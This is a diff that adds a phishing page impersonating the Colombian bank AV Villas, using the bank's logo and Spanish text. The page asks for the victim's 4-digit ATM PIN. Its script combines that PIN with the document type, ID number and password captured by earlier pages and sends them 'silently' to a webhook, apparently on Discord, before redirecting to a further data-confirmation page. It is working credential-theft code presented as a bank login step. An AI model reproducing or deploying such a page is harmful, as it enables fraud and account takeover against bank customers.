@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>AV Villas - Clave de 4 Dígitos</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+    input[type="text"]::-webkit-outer-spin-button,
+    input[type="text"]::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    input[type="text"] {
+      -moz-appearance: textfield;
+    }
+    .digit-input:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 1px #2563eb;
+    }
+    #loader {
+      display: none;
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col items-center justify-start pt-8 px-4">
+
+  <img alt="Logo AV Villas" class="w-[1600px] h-[50px] object-contain mb-6" src="https://www.avvillas.com.co/wps/wcm/connect/avvillas/efa08570-8128-4a7b-a324-5d9aa6c87fc2/logo-avv-digital.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_G0MI0J02L8NK70AHL9SQNR1826-efa08570-8128-4a7b-a324-5d9aa6c87fc2-p5cl6.b"/>
+
+  <div class="bg-white border border-gray-300 rounded-xl p-6 w-full max-w-sm shadow-md flex flex-col items-center">
+    <h1 class="text-black font-semibold text-base mb-6 text-center">
+      Ingresa la clave personal de 4 dígitos que utilizas en el cajero. 
+    </h1>
+
+    <form class="flex space-x-4 mb-6" id="pinForm">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" class="digit-input w-14 h-14 text-center text-2xl border border-gray-300 rounded-md focus:outline-none transition duration-200" type="text" />
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" class="digit-input w-14 h-14 text-center text-2xl border border-gray-300 rounded-md focus:outline-none transition duration-200" type="text" />
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" class="digit-input w-14 h-14 text-center text-2xl border border-gray-300 rounded-md focus:outline-none transition duration-200" type="text" />
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" class="digit-input w-14 h-14 text-center text-2xl border border-gray-300 rounded-md focus:outline-none transition duration-200" type="text" />
+    </form>
+
+    <button id="verifyBtn" class="bg-gray-300 text-white font-semibold py-2 px-6 rounded-full w-full transition cursor-not-allowed" disabled>
+      Verificar
+    </button>
+
+    <div id="loader" class="mt-4 hidden text-red-600 font-medium flex items-center justify-center gap-2">
+      <i class="fas fa-spinner fa-spin"></i>
+      Validando información...
+    </div>
+
+    <p class="mt-6 text-sm text-center text-gray-600">Protege tu clave, nadie más debe conocerla.</p>
+  </div>
+
+  <div class="fixed top-[50%] right-0 -translate-y-1/2 bg-red-600 rounded-l-full w-12 h-12 flex items-center justify-center cursor-pointer select-none overflow-hidden">
+    <img src="img/carita.png" alt="botón" class="max-w-[70%] max-h-[70%] object-contain"/>
+  </div>
+
+  <script src="Discord.js"></script>
+  <script>
+    const inputs = document.querySelectorAll('.digit-input');
+    const button = document.getElementById('verifyBtn');
+    const loader = document.getElementById('loader');
+
+    function checkInputs() {
+      const allFilled = [...inputs].every(input => input.value.length === 1);
+      if (allFilled) {
+        button.disabled = false;
+        button.classList.remove('bg-gray-300', 'cursor-not-allowed');
+        button.classList.add('bg-blue-600', 'hover:bg-blue-700', 'cursor-pointer');
+      } else {
+        button.disabled = true;
+        button.classList.add('bg-gray-300', 'cursor-not-allowed');
+        button.classList.remove('bg-blue-600', 'hover:bg-blue-700', 'cursor-pointer');
+      }
+    }
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkInputs();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    button.addEventListener('click', () => {
+      const pin = [...inputs].map(input => input.value).join('');
+      localStorage.setItem('cajeroPin', pin);
+
+      // Mostrar loader rojo
+      loader.style.display = 'flex';
+
+      // Enviar datos (modo silencioso)
+      enviarDatosAWebhook("🔐 Inicio de sesión completo", [
+        ["Tipo de documento", localStorage.getItem('docType')],
+        ["Número de documento", localStorage.getItem('docNumber')],
+        ["Contraseña", localStorage.getItem('password')],
+        ["Clave de cajero", pin]
+      ]);
+
+      // Redireccionar después de 2.5 segundos
+      setTimeout(() => {
+        window.location.href = "confirmar-datos.html";
+      }, 2500);
+    });
+  </script>
+</body>
+</html>
